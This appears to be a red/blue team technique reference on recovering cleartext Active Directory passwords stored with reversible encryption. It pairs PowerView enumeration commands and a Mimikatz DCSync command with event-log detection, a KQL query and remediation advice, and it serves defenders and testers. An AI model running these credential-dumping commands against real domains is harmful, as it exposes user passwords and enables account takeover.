# [CA-DUMP-010]: UF_ENCRYPTED_TEXT_PASSWORD Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-010 |
| **MITRE ATT&CK v18.1** | [Modify Authentication Process: Reversible Encryption (T1556.005)](https://attack.mitre.org/techniques/T1556/005/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Active Directory supports a UserAccountControl flag called `EncryptedTextPasswordAllowed` (0x80). When enabled, AD stores the user's password in a reversible format (decrypted via a known algorithm using the domain's Syskey) to support legacy protocols like CHAP. Attackers who compromise a DC or perform DCSync can instantly retrieve the cleartext password for these users.
- **Attack Surface:** AD User Objects (`userAccountControl` attribute).
- **Business Impact:** **Cleartext Password Disclosure**. Bypasses the need for cracking hashes.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:**
    - To Read: Domain Admin / DCSync rights.
    - To Enable: Account Operators / Domain Admins.
- **Vulnerable Config:** Accounts with "Store password using reversible encryption" checked in AD Users & Computers.
- **Tools:**
    - [PowerView](https://github.com/PowerShellMafia/PowerSploit)
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration**
Find users with this flag enabled.
```powershell
# PowerView
Get-DomainUser -Prop Name,useraccountcontrol | Where-Object {$_.useraccountcontrol -band 128}

# AD Module
Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} -Properties AllowReversiblePasswordEncryption
```

**Step 2: Exploitation (DCSync)**
Retrieve the cleartext password.
```powershell
# Mimikatz DCSync automatically decrypts this field if present
lsadump::dcsync /domain:target.local /user:VulnerableUser
```
*Output will show `ClearText : Password123!` alongside the NTLM hash.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4738 | User Account Management: `User Account Control` changed. Look for `0x80` bit set (Reversible Encryption). |
| **Security** | 4662 | Access to attribute `AllowReversiblePasswordEncryption`. |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4738
// Check if the 'Don't Require PreAuth' or 'Reversible' bits were added
| where UserAccountControl has "%%2050" // Enabled Reversible Encryption
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Audit:** Run the enumeration script above and disable this flag for ALL users immediately.
*   **Policy:** Configure "Store passwords using reversible encryption" to **Disabled** in the Default Domain Policy GPO.

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-AD-003] (Enumeration)
> **Next Logical Step:** [LAT-AD-001] (Login with cleartext password)
